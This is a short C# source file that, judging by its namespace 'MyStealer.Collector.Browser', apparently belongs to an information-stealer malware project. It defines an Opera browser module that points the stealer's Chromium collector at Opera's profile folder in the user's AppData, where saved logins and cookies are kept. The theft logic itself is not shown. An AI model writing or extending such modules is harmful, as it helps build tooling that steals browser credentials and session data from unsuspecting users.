using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Opera : Chromium
    {
        public override string ModuleName => "Opera";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Opera Software", "Opera Stable");
    }
}
